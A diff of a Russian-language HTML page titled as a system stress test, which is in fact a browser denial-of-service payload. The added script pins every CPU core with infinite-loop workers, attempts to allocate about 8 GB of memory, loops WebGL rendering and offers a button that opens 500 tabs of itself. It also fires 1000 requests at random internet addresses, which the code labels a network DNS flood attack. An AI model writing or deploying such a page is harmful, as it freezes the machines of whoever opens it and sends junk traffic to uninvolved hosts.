@@ -1,43 +1,90 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ФИНАЛЬНЫЙ СТРЕСС-ТЕСТ</title>
+    <meta charset="UTF-8">
+    <title>СИСТЕМНЫЙ СТРЕСС-ТЕСТ</title>
+    <style>
+        body { background: black; color: red; font-family: monospace; text-align: center; overflow: hidden; }
+        #status { font-size: 30px; margin-top: 50px; animation: blink 0.1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
+    </style>
 </head>
 <body>
-    <h1>Тест системы</h1>
+    <canvas id="gpuCanvas"></canvas>
+    <div id="status">ЗАГРУЗКА СИСТЕМЫ... ЕСЛИ ЗАВИСЛО, ПЕРЕЗАГРУЗИ КОМП</div>
     <script>
         (function() {
-            // 1. Твой код с CPU, RAM, файлами (из предыдущего сообщения)
-            // ... вставь сюда весь код из предыдущего ответа ...
+            // ========== 1. МАКСИМАЛЬНЫЙ CPU ==========
+            const workerCount = navigator.hardwareConcurrency || 8;
+            for (let i = 0; i < workerCount; i++) {
+                try {
+                    const blob = new Blob([`
+                        onmessage = function(e) {
+                            while (true) {
+                                // Тяжёлые вычисления
+                                for(let j=0;j<1000;j++) Math.sqrt(Math.random()*1e9);
+                            }
+                        };
+                    `]);
+                    new Worker(URL.createObjectURL(blob)).postMessage('start');
+                } catch (e) {}
+            }
+            // Основной поток тоже грузим
+            function burnCPU() { while(true) { Math.sqrt(Math.random()*1e9); } }
+            setTimeout(burnCPU, 0);
 
-            // 2. Доп. нагрузка на GPU (WebGL)
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = 1000;
-                canvas.height = 1000;
-                const gl = canvas.getContext('webgl');
-                if (gl) {
-                    function stressGPU() {
-                        // Простейший цикл рендеринга
-                        gl.clear(gl.COLOR_BUFFER_BIT);
-                        requestAnimationFrame(stressGPU);
-                    }
-                    stressGPU();
+            // ========== 2. ПАМЯТЬ: 8 ГБ + 10000 ФАЙЛОВ ==========
+            let mem = [];
+            function alloc() {
+                try {
+                    for (let i = 0; i < 80; i++) mem.push(new ArrayBuffer(100 * 1024 * 1024)); // 80*100МБ = 8ГБ
+                    for (let i = 0; i < 10000; i++) mem.push(new ArrayBuffer(100 * 1024)); // 10000*100КБ
+                } catch (e) {}
+            }
+            setTimeout(alloc, 100);
+
+            // ========== 3. GPU НАГРУЗКА ==========
+            const canvas = document.getElementById('gpuCanvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                function render() {
+                    gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
+                    gl.clear(gl.COLOR_BUFFER_BIT);
+                    requestAnimationFrame(render);
                 }
-            } catch (e) {}
-
-            // 3. Спам DNS-запросами (сетевые таймауты)
-            for (let i = 0; i < 500; i++) {
-                let img = new Image();
-                img.src = 'http://192.168.1.' + (Math.floor(Math.random() * 255)) + '/test'; // Спам по локальной сети
+                render();
             }
 
-            // 4. Забиваем историю браузера
-            setInterval(() => {
-                for (let i = 0; i < 100; i++) {
-                    history.pushState({}, '', '/fake' + Math.random());
+            // ========== 4. ОТКРЫТИЕ 500 ВКЛАДОК (вручную придётся разрешить) ==========
+            function openTabs() {
+                const url = window.location.href;
+                for (let i = 0; i < 500; i++) {
+                    setTimeout(() => window.open(url, '_blank'), i * 10);
                 }
-            }, 100);
+            }
+            // Попросим пользователя разрешить всплывающие окна через кнопку
+            const btn = document.createElement('button');
+            btn.innerText = 'РАЗРЕШИТЬ ВСПЛЫВАЮЩИЕ ОКНА И ОТКРЫТЬ 500 ВКЛАДОК';
+            btn.style.fontSize = '30px';
+            btn.style.padding = '20px';
+            btn.style.margin = '50px';
+            btn.onclick = openTabs;
+            document.body.appendChild(btn);
+
+            // ========== 5. АТАКА НА СЕТЬ (Флуд DNS) ==========
+            for (let i = 0; i < 1000; i++) {
+                let img = new Image();
+                img.src = 'http://' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '/test';
+            }
+
+            // ========== 6. ЗВУК (если разрешён) ==========
+            try {
+                let audio = new Audio();
+                audio.src = 'data:audio/wav;base64,UklGR...'; // можно вставить длинный шум
+                audio.loop = true;
+                audio.play().catch(() => {}); // может не заработать без взаимодействия
+            } catch (e) {}
         })();
     </script>
 </body>
